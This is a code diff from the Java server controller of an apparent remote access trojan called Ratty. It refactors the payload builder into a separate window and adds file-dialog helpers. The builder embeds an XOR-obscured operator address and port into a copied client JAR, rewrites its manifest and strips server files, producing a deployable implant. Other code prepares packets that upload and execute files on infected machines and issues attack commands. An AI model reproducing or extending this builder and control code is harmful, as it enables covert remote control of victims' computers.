@@ -12,7 +12,10 @@ import java.util.Set;
 
 import javax.imageio.ImageIO;
 import javax.swing.ImageIcon;
+import javax.swing.JFileChooser;
 import javax.swing.JOptionPane;
+import javax.swing.filechooser.FileFilter;
+import javax.swing.filechooser.FileNameExtensionFilter;
 
 import de.sogomn.engine.fx.Sound;
 import de.sogomn.rat.ActiveConnection;
@@ -49,15 +52,21 @@ import de.sogomn.rat.packet.WebsitePacket;
 import de.sogomn.rat.server.AbstractRattyController;
 import de.sogomn.rat.server.ActiveServer;
 import de.sogomn.rat.util.FrameEncoder.Frame;
+import de.sogomn.rat.util.Constants;
 import de.sogomn.rat.util.XorCipher;
 
 /*
  * Woah, this is a huge class.
+ * I know, I should have one controller for each GUI, but... You know... Nope.
+ * There will a point where I gotta do all the refactoring. Damn that's gonna be fun.
  */
 public final class RattyGuiController extends AbstractRattyController implements IGuiController {
 	
 	private ActiveServer server;
 	private IRattyGui gui;
+	private BuilderGui builder;
+	private File selectedFile;
+	private JFileChooser fileChooser;
 	
 	private HashMap<ActiveConnection, ServerClient> clients;
 	
@@ -92,7 +101,8 @@ public final class RattyGuiController extends AbstractRattyController implements
 		"language/lang_fr.properties",
 		"language/lang_ro.properties",
 		"de/sogomn/rat/Server.class",
-		"de/sogomn/rat/util/Resources.class"
+		"de/sogomn/rat/util/Resources.class",
+		"de/sogomn/rat/builder/JarBuilder.class"
 	};
 	
 	private static final String FREE_WARNING = LANGUAGE.getString("server.free_warning");
@@ -104,8 +114,6 @@ public final class RattyGuiController extends AbstractRattyController implements
 	private static final String OPTION_UDP = LANGUAGE.getString("server.udp");
 	private static final String ATTACK_MESSAGE = LANGUAGE.getString("server.attack_message");
 	private static final String BUILDER_ERROR_MESSAGE = LANGUAGE.getString("builder.error");
-	private static final String BUILDER_ADDRESS_QUESTION = LANGUAGE.getString("builder.address_question");
-	private static final String BUILDER_PORT_QUESTION = LANGUAGE.getString("builder.port_question");
 	private static final String URL_MESSAGE = LANGUAGE.getString("server.url_message");
 	private static final String AMOUNT_QUESTION = LANGUAGE.getString("server.amount_question");
 	private static final String FILE_NAME = LANGUAGE.getString("file_information.name");
@@ -147,11 +155,71 @@ public final class RattyGuiController extends AbstractRattyController implements
 			}
 		}, "Ping");
 		
+		builder = new BuilderGui();
+		fileChooser = new JFileChooser();
 		clients = new HashMap<ActiveConnection, ServerClient>();
 		startTime = System.currentTimeMillis();
 		
+		fileChooser.setCurrentDirectory(Constants.JAR_FILE);
+		builder.addListener(this);
+		
 		pingThread.setDaemon(true);
 		pingThread.start();
+	}
+	
+	public File getFile(final String type) {
+		final FileFilter filter;
+		
+		if (type != null) {
+			filter = new FileNameExtensionFilter("*." + type, type);
+		} else {
+			filter = null;
+		}
+		
+		fileChooser.setFileFilter(filter);
+		
+		final int input = fileChooser.showOpenDialog(null);
+		
+		if (input == JFileChooser.APPROVE_OPTION) {
+			final File file = fileChooser.getSelectedFile();
+			
+			return file;
+		}
+		
+		return null;
+	}
+	
+	public File getFile() {
+		return getFile(null);
+	}
+	
+	public File getSaveFile() {
+		final int input = fileChooser.showSaveDialog(null);
+		
+		if (input == JFileChooser.APPROVE_OPTION) {
+			final File file = fileChooser.getSelectedFile();
+			
+			return file;
+		}
+		
+		return null;
+	}
+	
+	public File getSaveFile(final String type) {
+		File file = getSaveFile();
+		
+		if (file == null) {
+			return null;
+		}
+		
+		final String name = file.getName().toLowerCase();
+		final String suffix = "." + type.toLowerCase();
+		
+		if (!name.endsWith(suffix)) {
+			file = new File(file + suffix);
+		}
+		
+		return file;
 	}
 	
 	/*
@@ -206,7 +274,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 	}
 	
 	private AudioPacket createAudioPacket() {
-		final File file = gui.getFile("WAV");
+		final File file = getFile("WAV");
 		final AudioPacket packet = new AudioPacket(file);
 		
 		return packet;
@@ -232,7 +300,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 			return null;
 		}
 		
-		final File file = gui.getFile();
+		final File file = getFile();
 		
 		if (file != null) {
 			final String path = node.getPath();
@@ -329,7 +397,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 	}
 	
 	private UploadFilePacket createUploadExecutePacket(final ServerClient client) {
-		final File file = gui.getFile();
+		final File file = getFile();
 		
 		if (file != null) {
 			final UploadFilePacket packet = new UploadFilePacket(file, "", true);
@@ -404,37 +472,37 @@ public final class RattyGuiController extends AbstractRattyController implements
 		client.connection.addPacket(packet);
 	}
 	
-	private void startBuilder() {
-		final File destination = gui.getSaveFile("JAR");
+	private void selectBuildFile() {
+		selectedFile = getSaveFile("JAR");
 		
-		if (destination == null) {
+		if (selectedFile != null) {
+			final String text = "[" + selectedFile.getName() + "]";
+			
+			builder.setFileLabel(text);
+		} else {
+			builder.setFileLabel("");
+		}
+	}
+	
+	private void build() {
+		if (selectedFile == null) {
 			return;
 		}
 		
-		final String address = gui.getInput(BUILDER_ADDRESS_QUESTION);
-		
-		if (address == null) {
-			return;
-		}
-		
-		final String port = gui.getInput(BUILDER_PORT_QUESTION);
-		
-		if (port == null) {
-			return;
-		}
-		
+		final String address = builder.getAddressInput();
+		final String port = builder.getPortInput();
 		final String dataReplacementString = String.format(BUILDER_DATA_REPLACEMENT_FORMAT, address, port);
 		final byte[] dataReplacement = dataReplacementString.getBytes();
 		
 		XorCipher.crypt(dataReplacement);
 		
 		try {
-			JarBuilder.copy(destination);
-			JarBuilder.replaceFile(destination, BUILDER_DATA_REPLACEMENT, dataReplacement);
-			JarBuilder.replaceFile(destination, BUILDER_MANIFEST_REPLACEMENT, BUILDER_MANIFEST_REPLACEMENT_DATA);
+			JarBuilder.copy(selectedFile);
+			JarBuilder.replaceFile(selectedFile, BUILDER_DATA_REPLACEMENT, dataReplacement);
+			JarBuilder.replaceFile(selectedFile, BUILDER_MANIFEST_REPLACEMENT, BUILDER_MANIFEST_REPLACEMENT_DATA);
 			
 			for (final String removal : BUILDER_REMOVALS) {
-				JarBuilder.removeFile(destination, removal);
+				JarBuilder.removeFile(selectedFile, removal);
 			}
 		} catch (final IOException ex) {
 			gui.showError(BUILDER_ERROR_MESSAGE + System.lineSeparator() + ex.getMessage());
@@ -470,10 +538,18 @@ public final class RattyGuiController extends AbstractRattyController implements
 			requestFile(client);
 		} else if (command == RattyGui.CHAT) {
 			client.chat.setVisible(true);
-		} else if (command == RattyGui.CLOSE) {
+		}
+	}
+	
+	private void handleGlobalCommand(final String command) {
+		if (command == RattyGui.CLOSE) {
 			server.close();
 		} else if (command == RattyGui.BUILD) {
-			startBuilder();
+			builder.setVisible(true);
+		} else if (command == BuilderGui.CHOOSE) {
+			selectBuildFile();
+		} else if (command == BuilderGui.BUILD) {
+			build();
 		}
 	}
 	
@@ -807,13 +883,17 @@ public final class RattyGuiController extends AbstractRattyController implements
 			client = null;
 		}
 		
-		final IPacket packet = createPacket(client, command);
-		
-		if (packet != null) {
-			client.connection.addPacket(packet);
+		if (client != null) {
+			final IPacket packet = createPacket(client, command);
+			
+			if (packet != null) {
+				client.connection.addPacket(packet);
+			}
+			
+			handleCommand(client, command);
 		}
 		
-		handleCommand(client, command);
+		handleGlobalCommand(command);
 	}
 	
 	public final ServerClient getClient(final ActiveConnection searched) {
